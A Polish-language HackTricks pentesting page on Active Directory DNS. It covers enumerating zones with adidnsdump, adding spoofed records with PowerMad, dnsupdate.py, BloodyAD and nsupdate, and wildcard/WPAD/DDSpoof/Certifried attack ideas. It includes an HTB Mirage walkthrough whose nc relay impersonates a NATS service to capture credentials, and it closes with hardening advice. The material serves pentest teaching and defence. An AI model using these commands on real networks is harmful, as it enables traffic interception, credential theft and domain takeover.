# Rekordy DNS AD

{{#include ../../banners/hacktricks-training.md}}

Domyślnie **każdy użytkownik** w Active Directory może **wyliczyć wszystkie rekordy DNS** w strefach DNS domeny lub lasu, podobnie jak w przypadku transferu strefy (użytkownicy mogą wyświetlać obiekty podrzędne strefy DNS w środowisku AD).

Narzędzie [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) umożliwia **wyliczanie** i **eksportowanie** **wszystkich rekordów DNS** ze strefy w celu rozpoznania sieci wewnętrznych.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (kwiecień 2025) dodaje wyjście w formacie JSON/Greppable (`--json`), wielowątkowe rozwiązywanie DNS oraz obsługę TLS 1.2/1.3 podczas łączenia z LDAPS  

Więcej informacji: [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Tworzenie / modyfikowanie rekordów (ADIDNS spoofing)

Ponieważ grupa **Authenticated Users** ma domyślnie uprawnienie **Create Child** na liście DACL strefy, każde konto domenowe (lub konto komputera) może zarejestrować dodatkowe rekordy. Można to wykorzystać do przechwytywania ruchu, wymuszania NTLM relay, a nawet pełnego przejęcia domeny.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py jest dołączany do Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Typowe prymitywy ataku

1. **Rekord wildcard** – `*.<zone>` zmienia serwer AD DNS w respondera dla całej organizacji, podobnego do spoofingu LLMNR/NBNS. Można go wykorzystać do przechwytywania hashy NTLM lub przekazywania ich do LDAP/SMB. (Wymaga wyłączenia WINS-lookup.)<sup>[[1]](#references)</sup>    
2. **Przejęcie WPAD** – dodaj `wpad` (lub rekord **NS** wskazujący na hosta atakującego, aby ominąć Global-Query-Block-List) i transparentnie proxy’uj wychodzące żądania HTTP, aby pozyskać dane uwierzytelniające. Microsoft załatał obejścia z użyciem wildcard/DNAME (CVE-2018-8320), ale **rekordy NS nadal działają**.<sup>[[1]](#references)</sup>    
3. **Przejęcie nieaktualnego wpisu** – przejmij adres IP, który wcześniej należał do stacji roboczej; powiązany wpis DNS nadal będzie rozwiązywany, umożliwiając ataki resource-based constrained delegation lub Shadow-Credentials bez jakiejkolwiek ingerencji w DNS.    
4. **Spoofing DHCP → DNS** – w domyślnym wdrożeniu Windows DHCP+DNS nieuwierzytelniony atakujący w tej samej podsieci może nadpisać dowolny istniejący rekord A (w tym rekordy kontrolerów domeny), wysyłając sfałszowane żądania DHCP, które wywołują dynamiczne aktualizacje DNS (Akamai „DDSpoof”, 2023). Daje to możliwość przeprowadzenia ataku machine-in-the-middle na Kerberos/LDAP i może doprowadzić do pełnego przejęcia domeny.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – zmień `dNSHostName` kontrolowanego przez siebie konta maszyny, zarejestruj pasujący rekord A, a następnie zażądaj certyfikatu dla tej nazwy, aby podszyć się pod DC. Narzędzia takie jak **Certipy** lub **BloodyAD** w pełni automatyzują ten proces.  

Rekord AD DNS z [serializowanymi informacjami o celu](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) może stanowić część warunkowego łańcucha relay: wywołujący potrzebuje uprawnień do tworzenia rekordów, ścieżki wymuszenia uwierzytelnienia, która skłoni komputer docelowy do uwierzytelnienia się na tej nazwie, oraz miejsca docelowego relay, które akceptuje wynikowe uwierzytelnienie. Osobno oceń protokół miejsca docelowego; podpisywanie SMB na połączeniu przychodzącym samo w sobie nie przesądza, czy docelowe HTTPS WinRM akceptuje relay. Poziom poprawek, obsługa nazw, Extended Protection i konfiguracja usługi mogą wpłynąć na wynik.

---

### Przejęcie wewnętrznej usługi przez nieaktualne rekordy dynamiczne (case study NATS)

Gdy aktualizacje dynamiczne są dostępne dla wszystkich uwierzytelnionych użytkowników, **można ponownie zarejestrować wyrejestrowaną nazwę usługi i skierować ją do infrastruktury atakującego**. Kontroler domeny Mirage HTB udostępniał hostname `nats-svc.mirage.htb` po czyszczeniu DNS, więc każdy użytkownik z niskimi uprawnieniami mógł:<sup>[[3]](#references)</sup>

1. **Potwierdzić brak rekordu** i poznać SOA za pomocą `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Utwórz ponownie rekord** wskazujący na zewnętrzny/interfejs VPN, który kontrolują:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Podszyj się pod usługę plaintext**. Klienci NATS oczekują otrzymania jednego banera `INFO { ... }` przed wysłaniem poświadczeń, więc skopiowanie prawidłowego banera z rzeczywistego brokera wystarczy, aby przechwycić sekrety:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Any client, który rozwiąże przejętą nazwę, natychmiast ujawni listenerowi swoją ramkę JSON `CONNECT` (w tym `"user"`/`"pass"`). Uruchomienie oficjalnego pliku binarnego `nats-server -V` na hoście atakującego, wyłączenie redakcji logów albo po prostu przechwycenie sesji za pomocą Wireshark daje te same poświadczenia w postaci jawnego tekstu, ponieważ TLS był opcjonalny.

4. **Pivot z użyciem przechwyconych poświadczeń** – w Mirage skradzione konto NATS zapewniło dostęp do JetStream, który ujawnił historyczne zdarzenia uwierzytelniania zawierające wielokrotnego użytku nazwy użytkowników/hasła AD.

Ten wzorzec dotyczy każdej usługi zintegrowanej z AD, która opiera się na niezabezpieczonych uzgadnianiach TCP (API HTTP, RPC, MQTT itd.): po przejęciu rekordu DNS atakujący staje się usługą.
Informacje o enumeracji po stronie brokera i procedurze obsługi zachowanych wiadomości znajdziesz w [pentestach NATS / JetStream](../../network-services-pentesting/4222-pentesting-nats.md).

---

## Wykrywanie i wzmacnianie zabezpieczeń

* Odbierz grupie **Authenticated Users** prawo *Create all child objects* w strefach wrażliwych i deleguj aktualizacje dynamiczne dedykowanemu kontu używanemu przez DHCP.
* Jeśli aktualizacje dynamiczne są wymagane, ustaw strefę na **Secure-only** i włącz **Name Protection** w DHCP, aby tylko obiekt komputera będący właścicielem mógł nadpisać własny rekord.
* Monitoruj identyfikatory zdarzeń DNS Server 257/252 (aktualizacja dynamiczna), 770 (transfer strefy) oraz zapisy LDAP w `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blokuj niebezpieczne nazwy (`wpad`, `isatap`, `*`) za pomocą celowo nieszkodliwego rekordu lub przez Global Query Block List.
* Aktualizuj serwery DNS — np. luki RCE CVE-2024-26224 i CVE-2024-26231 uzyskały **CVSS 9.8** i mogą być zdalnie wykorzystywane przeciwko kontrolerom domeny.  



## References

- [1] [ADIDNS na nowo — WPAD, GQBL i nie tylko](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Podszywanie się pod rekordy DNS przez nadużywanie dynamicznych aktualizacji DNS przez DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: łączenie wycieków NFS, nadużyć Dynamic DNS, kradzieży poświadczeń NATS, sekretów JetStream i Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Wejście do strefy: zrzucanie DNS Active Directory za pomocą adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
